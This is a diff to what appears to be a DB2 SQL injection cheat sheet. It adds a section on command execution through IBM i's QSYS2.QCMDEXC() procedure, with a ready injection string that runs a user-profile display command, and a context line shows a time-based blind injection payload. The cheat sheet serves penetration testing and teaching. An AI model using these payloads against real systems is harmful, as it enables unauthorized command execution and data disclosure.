@@ -12,6 +12,7 @@
 * [DB2 Error Based](#db2-error-based)
 * [DB2 Blind Based](#db2-blind-based)
 * [DB2 Time Based](#db2-time-based)
+* [DB2 Command Execution](#db2-command-execution)
 * [DB2 WAF Bypass](#db2-waf-bypass)
 * [DB2 Accounts and Privileges](#db2-accounts-and-privileges)
 * [References](#references) 
@@ -102,6 +103,16 @@ Heavy queries, if user starts with ascii 68 ('D'), the heavy query will be execu
 ' and (SELECT count(*) from sysibm.columns t1, sysibm.columns t2, sysibm.columns t3)>0 and (select ascii(substr(user,1,1)) from sysibm.sysdummy1)=68 
 ```
 
+## DB2 Command Execution
+
+> The QSYS2.QCMDEXC() procedure and scalar function can be used to execute IBM i CL commands.
+
+Using the `QSYS2.QCMDEXC()` on IBM i (previously named AS-400), it is possibile to achieve command execution.
+
+```sql
+'||QCMDEXC('QSH CMD(''system dspusrprf PROFILE'')')
+```
+
 
 ## DB2 WAF Bypass
 
@@ -131,3 +142,4 @@ SELECT chr(65)||chr(68)||chr(82)||chr(73) FROM sysibm.sysdummy1
 
 - [DB2 SQL injection cheat sheet - Adrián - May 20, 2012](https://securityetalii.es/2012/05/20/db2-sql-injection-cheat-sheet/)
 - [Pentestmonkey's DB2 SQL Injection Cheat Sheet - @pentestmonkey - September 17, 2011](http://pentestmonkey.net/cheat-sheet/sql-injection/db2-sql-injection-cheat-sheet)
+- [QSYS2.QCMDEXC() - IBM Support - April 22, 2023](https://www.ibm.com/support/pages/qsys2qcmdexc)
